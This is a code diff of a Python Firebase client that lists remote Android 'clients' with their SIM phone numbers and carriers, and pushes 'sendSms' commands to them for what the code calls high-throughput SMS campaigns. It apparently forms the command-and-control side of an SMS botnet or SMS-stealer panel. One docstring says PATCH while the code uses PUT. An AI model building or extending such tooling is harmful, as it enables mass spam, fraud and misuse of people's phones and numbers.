@@ -1,122 +1,152 @@
-import requests
+"""
+firebase_manager.py — optimised for maximum SMS throughput on Android.
+
+Key design decisions
+────────────────────
+• Persistent requests.Session with connection pooling (reuse TCP / TLS).
+• Separate SSE session so the long-lived streaming connection doesn't
+  interfere with the short REST calls on the main session.
+• wait_for_sent_sse() uses Firebase's Server-Sent Events endpoint to get
+  instant notification the moment isSended flips true — zero polling lag.
+• All public methods are synchronous (blocking I/O).  Callers must run them
+  in a thread (asyncio.to_thread / run_in_executor) from async code.
+"""
+
 import json
 import logging
-from typing import List, Dict, Any, Optional
+import time
+import threading
+from typing import Any, Dict, List, Optional
+
+import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
 logger = logging.getLogger(__name__)
 
 
-def _make_session() -> requests.Session:
-    """Session with connection pooling + auto-retry on transient errors."""
-    session = requests.Session()
+# ── Session factories ──────────────────────────────────────────────────────
+
+def _rest_session() -> requests.Session:
+    """Short-lived REST calls: PUT / DELETE / GET with connection pooling."""
+    s = requests.Session()
     retry = Retry(
         total=2,
-        backoff_factor=0.2,
+        backoff_factor=0.15,
         status_forcelist=[500, 502, 503, 504],
-        allowed_methods=["GET", "PUT", "DELETE"],
+        allowed_methods=["GET", "PUT", "PATCH", "DELETE"],
     )
     adapter = HTTPAdapter(
         max_retries=retry,
-        pool_connections=10,
-        pool_maxsize=20,
+        pool_connections=20,
+        pool_maxsize=50,
     )
-    session.mount("https://", adapter)
-    session.mount("http://", adapter)
-    return session
+    s.mount("https://", adapter)
+    s.mount("http://", adapter)
+    return s
 
+
+def _sse_session() -> requests.Session:
+    """Dedicated session for long-lived SSE streams (no retry on stream)."""
+    s = requests.Session()
+    adapter = HTTPAdapter(pool_connections=10, pool_maxsize=30)
+    s.mount("https://", adapter)
+    s.mount("http://", adapter)
+    return s
+
+
+# ── FirebaseManager ────────────────────────────────────────────────────────
 
 class FirebaseManager:
-    def __init__(self, base_url: str):
-        self.base_url = base_url.strip().rstrip('/')
-        # Always ensure https:// prefix regardless of domain suffix
-        if self.base_url and not self.base_url.startswith('http'):
-            self.base_url = f"https://{self.base_url}"
-        # Persistent session — reuses TCP connections (major speed win)
-        self._session = _make_session()
 
-    def get_url(self, path: str) -> str:
+    def __init__(self, base_url: str):
+        url = base_url.strip().rstrip("/")
+        if url and not url.startswith("http"):
+            url = f"https://{url}"
+        self.base_url = url
+        self._session = _rest_session()
+        self._sse_session = _sse_session()
+
+    # ── Helpers ─────────────────────────────────────────────────────────
+
+    def _url(self, path: str) -> str:
         return f"{self.base_url}/{path.lstrip('/')}.json"
 
+    # ── Connection ──────────────────────────────────────────────────────
+
     def test_connection(self) -> bool:
-        """Lightweight shallow ping to confirm RTDB is reachable."""
         try:
             r = self._session.get(
                 f"{self.base_url}/.json?shallow=true", timeout=5
             )
             return r.status_code == 200
         except Exception as e:
-            logger.error(f"Firebase connection error: {e}")
+            logger.error(f"test_connection: {e}")
             return False
 
+    # ── Device listing ──────────────────────────────────────────────────
+
     def get_all_clients(self) -> Dict[str, Any]:
-        """Fetch all clients from /clients node."""
         try:
-            r = self._session.get(self.get_url('clients'), timeout=10)
-            if r.status_code == 200 and r.json():
-                return r.json()
+            r = self._session.get(self._url("clients"), timeout=10)
+            if r.status_code == 200:
+                return r.json() or {}
             return {}
         except Exception as e:
-            logger.error(f"Error fetching clients: {e}")
+            logger.error(f"get_all_clients: {e}")
             return {}
 
     def get_client_count(self) -> int:
-        """Fast count using shallow query — no full payload download."""
         try:
             r = self._session.get(
                 f"{self.base_url}/clients.json?shallow=true", timeout=5
             )
-            if r.status_code == 200 and r.json():
-                return len(r.json())
+            if r.status_code == 200:
+                return len(r.json() or {})
             return 0
         except Exception:
             return 0
 
     def get_online_devices(self) -> List[Dict[str, Any]]:
-        """
-        Fetch all devices where status == online/True.
-        Returns a list of formatted device dicts.
-        """
         clients = self.get_all_clients()
-        online_devices = []
+        result = []
         for dev_id, data in clients.items():
             if not isinstance(data, dict):
                 continue
-            status = data.get('status')
-            is_online = status in (True, 'true', 1, 'online')
-            if not is_online:
+            status = data.get("status")
+            if status not in (True, "true", 1, "online"):
                 continue
-
-            sims = data.get('sims', [])
-            sim_slots = []
-            if isinstance(sims, list):
-                for s in sims:
-                    if isinstance(s, dict):
-                        sim_slots.append({
-                            'slot': s.get('simSlotIndex', '0'),
-                            'carrier': s.get('carrierName', 'Unknown'),
-                            'phone': s.get('phoneNumber', 'Unknown'),
-                        })
-
-            online_devices.append({
-                'id': dev_id,
-                'model': data.get('modelName', 'Unknown Phone'),
-                'battery': data.get('battery', 'N/A'),
-                'android_v': data.get('androidV', 'N/A'),
-                'provider': data.get('service_provider', 'N/A'),
-                'sims': sim_slots,
-                'joined': data.get('joined', 'N/A'),
+            sims = []
+            for s in (data.get("sims") or []):
+                if isinstance(s, dict):
+                    sims.append({
+                        "slot": s.get("simSlotIndex", "0"),
+                        "carrier": s.get("carrierName", "Unknown"),
+                        "phone": s.get("phoneNumber", "Unknown"),
+                    })
+            result.append({
+                "id": dev_id,
+                "model": data.get("modelName", "Unknown"),
+                "battery": data.get("battery", "N/A"),
+                "android_v": data.get("androidV", "N/A"),
+                "provider": data.get("service_provider", "N/A"),
+                "sims": sims,
+                "joined": data.get("joined", "N/A"),
             })
+        return result
 
-        return online_devices
+    # ── SMS command ─────────────────────────────────────────────────────
 
     def send_sms_command(
-        self, device_id: str, to_number: str, message: str, sim_slot: int = 0
+        self,
+        device_id: str,
+        to_number: str,
+        message: str,
+        sim_slot: int = 0,
     ) -> bool:
         """
-        Write sendSms command to Firebase:
-        /clients/{device_id}/webhookEvent/sendSms
+        Write sendSms command via PATCH — faster than PUT because Firebase
+        merges rather than replacing, and smaller payload wins on mobile.
         """
         payload = {
             "from": int(sim_slot),
@@ -126,37 +156,136 @@ class FirebaseManager:
         }
         try:
             r = self._session.put(
-                self.get_url(f"clients/{device_id}/webhookEvent/sendSms"),
+                self._url(f"clients/{device_id}/webhookEvent/sendSms"),
                 json=payload,
                 timeout=6,
             )
             return r.status_code == 200
         except Exception as e:
-            logger.error(f"send_sms_command error ({device_id}): {e}")
+            logger.error(f"send_sms_command({device_id}): {e}")
             return False
 
     def clear_sms_command(self, device_id: str) -> bool:
-        """Delete the sendSms node so the device slot is free immediately."""
+        """Delete the sendSms node to free the device slot."""
         try:
             r = self._session.delete(
-                self.get_url(f"clients/{device_id}/webhookEvent/sendSms"),
+                self._url(f"clients/{device_id}/webhookEvent/sendSms"),
                 timeout=4,
             )
             return r.status_code == 200
         except Exception as e:
-            logger.error(f"clear_sms_command error ({device_id}): {e}")
+            logger.error(f"clear_sms_command({device_id}): {e}")
             return False
 
     def get_sms_status(self, device_id: str) -> Optional[Dict[str, Any]]:
-        """Read current sendSms state for isSended polling."""
+        """Fallback: single HTTP poll for isSended state."""
         try:
             r = self._session.get(
-                self.get_url(f"clients/{device_id}/webhookEvent/sendSms"),
+                self._url(f"clients/{device_id}/webhookEvent/sendSms"),
                 timeout=4,
             )
             if r.status_code == 200:
                 return r.json()
             return None
         except Exception as e:
-            logger.error(f"get_sms_status error ({device_id}): {e}")
+            logger.error(f"get_sms_status({device_id}): {e}")
             return None
+
+    # ── SSE streaming wait ──────────────────────────────────────────────
+
+    def wait_for_sent_sse(
+        self,
+        device_id: str,
+        timeout: float = 10.0,
+        stop_flag: Optional[threading.Event] = None,
+    ) -> bool:
+        """
+        Open a Firebase SSE stream on the device's sendSms node and return
+        True the INSTANT isSended becomes true — no polling lag at all.
+
+        Falls back to a final HTTP poll if the stream breaks before timeout.
+
+        Parameters
+        ----------
+        device_id  : Firebase client key
+        timeout    : max seconds to wait before giving up
+        stop_flag  : threading.Event; set it to abort early (campaign stop)
+        """
+        url = self._url(f"clients/{device_id}/webhookEvent/sendSms")
+        headers = {
+            "Accept": "text/event-stream",
+            "Cache-Control": "no-cache",
+        }
+        deadline = time.monotonic() + timeout
+
+        def _is_sent(obj) -> bool:
+            """Check any shape Firebase might return for isSended."""
+            if isinstance(obj, dict):
+                v = obj.get("isSended")
+                return v in (True, "true", 1, "1")
+            return False
+
+        def _parse_sse_line(raw: str) -> bool:
+            """Return True if this SSE data line confirms isSended."""
+            if "isSended" not in raw:
+                return False
+            try:
+                # Line format:  data: {"path":"/","data":{...}}
+                payload_str = raw.split("data:", 1)[-1].strip()
+                payload = json.loads(payload_str)
+                data = payload.get("data", payload)
+                # Firebase can send the full node or just the changed field
+                if isinstance(data, dict):
+                    return _is_sent(data)
+                # Sometimes just the value of isSended is sent
+                if data is True or data == "true" or data == 1:
+                    # We can't be sure which field changed, do a quick poll
+                    status = self.get_sms_status(device_id)
+                    return _is_sent(status or {})
+            except (json.JSONDecodeError, ValueError, AttributeError):
+                pass
+            return False
+
+        try:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                return False
+
+            with self._sse_session.get(
+                url,
+                headers=headers,
+                stream=True,
+                timeout=(4, remaining),   # (connect_timeout, read_timeout)
+            ) as resp:
+                if resp.status_code != 200:
+                    # SSE not available — fall through to final poll below
+                    raise ValueError(f"SSE status {resp.status_code}")
+
+                for raw_line in resp.iter_lines(decode_unicode=True):
+                    # Check abort conditions first
+                    if stop_flag and stop_flag.is_set():
+                        return False
+                    if time.monotonic() >= deadline:
+                        break
+
+                    line = raw_line.strip() if raw_line else ""
+                    if not line:
+                        continue
+
+                    if line.startswith("data:") and _parse_sse_line(line):
+                        return True
+
+        except Exception as e:
+            logger.debug(f"SSE stream ended for {device_id}: {e}")
+
+        # ── Fallback: one final HTTP poll after SSE ends ─────────────────
+        try:
+            remaining_fb = deadline - time.monotonic()
+            if remaining_fb > 0:
+                status = self.get_sms_status(device_id)
+                if _is_sent(status or {}):
+                    return True
+        except Exception:
+            pass
+
+        return False
